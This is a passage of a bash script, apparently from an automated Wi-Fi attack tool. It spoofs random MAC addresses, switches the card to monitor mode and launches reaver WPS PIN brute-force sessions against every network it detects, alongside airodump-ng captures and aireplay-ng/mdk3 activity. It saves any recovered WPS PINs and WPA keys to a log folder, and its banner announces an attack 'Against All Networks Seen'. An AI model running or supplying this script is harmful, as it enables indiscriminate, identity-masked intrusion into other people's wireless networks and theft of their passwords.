if [[ $numi1 > 0 ]];then

ssid=$(echo $SSIDS|awk '{ print $'$numi1' }') # cut SSID list
bssid=$(echo $BSSIDS|awk '{ print $'$numi1' }')
channel=$(echo $CHANN|awk '{ print $'$numi1' }') # cut Channel list
sleep 1
bssidwpc=$(echo $bssid | sed -e 's/://g')
sleep 1
bssidwpc=$(echo $bssidwpc | sed -e 's/-//g')
# remove single quote
bssidwpc=$(echo $bssidwpc | tr -d "'")

ssid=$(echo $ssid | sed -e 's/(//g')
ssid=$(echo $ssid | sed -e 's/)//g')

sleep 3

if [[ "$airmontype" == "Interface" ]]; then

airmon-ng stop $monitor &>dev\null

echo "[+] Spoofing with random mac address."
	ifconfig $DEV down  
	macchanger -A $DEV &>dev\null
	sleep 2 # give op time to complete
	ifconfig $DEV up

		if [[ $ifselect == old ]]; then

            VARMAC=$(ifconfig $DEV | awk '{print $5}')
            sleep 0.5
            VARMAC=$(echo $VARMAC | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

VARMAC=$(ifconfig $DEV | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

		fi

VARMAC=$(echo $VARMAC | awk '{print $1}'| sed -e  's/^\(.\{17\}\).*$/\1/' | sed -r 's/[-]+/:/g') # limit to 17 in length and replace - with :

sleep 2

echo -e "[+] Putting $DEV in monitor mode @ $monitor with channel $channel." # notify monitor mode
sleep 3
airmon-ng start $DEV &>dev\null # start monitor mode on interface
 
echo "[+] Spoofing with random mac address."
	ifconfig $monitor down  
	macchanger -m $VARMAC $monitor &>dev\null
	sleep 2 # give op time to complete
	ifconfig $monitor up

#		if [[ $ifselect == old ]]; then

#           VARMAC=$(ifconfig $monitor | awk '{print $5}')
#            sleep 0.5
#            VARMAC=$(echo $VARMAC | awk '{print $1}')

#			fi

#		if [[ $ifselect == new ]]; then

#VARMAC=$(ifconfig $monitor | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

#		fi

#        VARMAC=$(ifconfig $monitor | awk '{print $5}')
#            sleep 0.5


		fi

if [[ "$airmontype" != "Interface" ]]; then

	ifconfig $monitor down
        iwconfig $monitor mode manage
	ifconfig $monitor up
	ifconfig $monitor down
	macchanger -A $monitor &>dev\null
	sleep 2  # give time for op
	ifconfig $monitor up 

		if [[ $ifselect == old ]]; then

            VARMAC=$(ifconfig $monitor | awk '{print $5}')
            sleep 0.5
            VARMAC=$(echo $VARMAC | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

VARMAC=$(ifconfig $monitor | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

		fi

	sleep .5
	ifconfig $monitor down &>dev\null
	macchanger -m $VARMAC $monitor &>dev\null
	sleep 2  # give time for op
	ifconfig $monitor up &>dev\null
	echo -e "[+] Putting $DEV in monitor mode @ $monitor with channel $channel" # notify monitor mode
	ifconfig $DEV down
	iwconfig $DEV mode monitor
	ifconfig $DEV up
	ifconfig $monitor down &>dev\null
	iwconfig $monitor mode monitor &>dev\null
	ifconfig $monitor up &>dev\null

		fi

sleep 3
ESSIDNAME2=
clear
echo -e "$txtrst"
echo -e "[+]  *******************************"
echo -e "[+]  * Active Attack Phase Started *"
echo -e "[+]  *  Against All Networks Seen  *"

if [ $LOCK_SEL == y ] || [ $LOCK_SEL == Y ] && [ $ROUTSEL == n ] || [ $ROUTSEL == N ]; then

		echo -e "[+] Attacking ALL Locked & Unlocked WPS Enabled Networks."

			fi

if [ $LOCK_SEL == n ] || [ $LOCK_SEL == N ] && [ $ROUTSEL == y ] || [ $ROUTSEL == Y ]; then 

		echo -e "[+] Attacking Only Unlocked WPS Enabled Networks."
		echo -e "[+] Only routers with $MACSIX-XX:XX:XX will be attacked."

			fi

if [ $LOCK_SEL == y ] || [ $LOCK_SEL == Y ] && [ $ROUTSEL == y ] || [ $ROUTSEL == Y ]; then

		echo -e "[+] Attacking ALL Locked & Unlocked WPS Enabled Networks."
		echo -e "[+] Only routers with $MACSIX-XX:XX:XX will be attacked."

			fi

if [ $LOCK_SEL == n ] || [ $LOCK_SEL == N ] && [ $ROUTSEL == n ] || [ $ROUTSEL == N ]; then 

		echo -e "[+] Attacking only Unlocked WPS Enabled Networks."

			fi

echo -e "[+] Cycles Remaining   : $COUNT"
echo -e "[+] Targets This Cycle : $number1"
echo -e "[+] Targets Remaining  : $numi1"
echo -e "[+] Current SSID       : $ssid"
echo -e "[+] Current BSSID      : $bssid"
 
if [[ "$airmontype" == "Interface" ]]; then

echo -e "[+] Current Device Mac : $VARMAC"

		fi

if [[ "$airmontype" != "Interface" ]]; then

echo -e "[+] Current Device Mac : $VARMAC"

		fi

	if [[ $numi1 < $number1 ]]; then

xterm -g 40x20+0+0 -T "Targets Remaining" -e "sed -n '1,$numi1 p' /tmp/APNAME_LIST.txt; sleep 30" &

		fi

CHKPINFILE_fn

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]] && [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x15-1+1 -T "reaver $ssid" -e "reaver -i $monitor -a -f -c $channel -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

#xterm -g 80x15-1+1 -T "reaver" -e "reaver -i $monitor -c 1 -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=00:11:22:33:44:55 2>&1 | tee -a /root/test" &

			fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]] && [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x15-1+1 -T "reaver $ssid" -e "reaver -i $monitor -a -f -c $channel -b $bssid -r 2:15 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi


#Reaver 1.6b

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]] && [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x15-1+1 -T "reaver $ssid" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=/etc/reaver/$bssidwpc.wpc 2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

#xterm -g 80x15-1+1 -T "reaver" -e "reaver -i $monitor -c 1 -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=00:11:22:33:44:55 2>&1 | tee -a /root/test" &

			fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]] && [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x15-1+1 -T "reaver $ssid" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=/etc/reaver/$bssidwpc.wpc 2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

#windowID=$(xwininfo -name "reaver $ssid" | grep 'Window id:' | cut -d" " -f4)

#sleep 1

#xdotool windowactivate --sync $windowID key y

sleep 1

xterm -g 80x15-1+220 -T "Airodump-ng Scan 0" -e "airodump-ng -c $channel --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/singchan $monitor" &

sleep 1

AIRACT_fn
#sets airplay-ng/mdk3 activity

sleep 1

echo -e "[+] Entering Reaver Brute Force WPS Collection Phase$txtrst"
echo -e "[+]"
echo -e "[+] See /root/VARMAC_WPSWPA/"
echo -e "[+] For any WPS Pins or WPA Keys found"
echo -e "[+]"
echo -e "[+] Time before program restart"
seconds=$reavertime; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "    $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

# Do not kill reaver thru killall
# reaver must be shut down thru process or no save of data to pin file
# airmon-ng check-output changed therefore older airmon process routine fails with new airmon-ng

PIDREV1=$(pgrep reaver)

kill -s SIGINT $PIDREV1
sleep 1
killall -q airodump-ng &>dev\null
sleep 1
killall -q aireplay-ng &>dev\null
sleep 1
killall -q xterm &>dev\null
#killall -q Eterm &>dev\null
sleep 1

rm -f /tmp/ESSIDPROBE_DIR/*.kismet.csv

# REMOVE ONLY varmac

sleep .1
cat /tmp/ESSIDPROBE_DIR/singchan*.csv >> /tmp/ESSIDPROBE_DIR/allcsv.txt

sleep .2

rm -f /tmp/ESSIDPROBE_DIR/singchan.csv



PINFOUND_fn #looks for WPA key found

	if [[ $USE_PROBE == y ]] || [[ $USE_PROBE == Y ]] || [[ $USE_REF == y || $USE_REF == Y ]]; then

	echo -e "$txtrst[+] Standby while all ESSID Probe Data from airodump-ng is processed...."

				fi

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then

			ESSIDPROBE_fn

				fi

	if [[ $USE_REF == y ]] || [[ $USE_REF == Y ]]; then

			ESSIDREF_fn

				fi

sleep 3

PDDSA_fn

numi1=$(expr "$numi1" - 1) # loop number of networks in the number of SSID from ssid list

	if [[ $numi1 = 0 && $COUNT = 0 ]]; then

exit_fn # exit

	fi

	if [[ "$airmontype" == "Interface" ]]; then

		airmon-ng stop $monitor &>dev\null # stop monitor

		fi

attack_fn # loop back to function

		fi

}

prepare_fn
#done
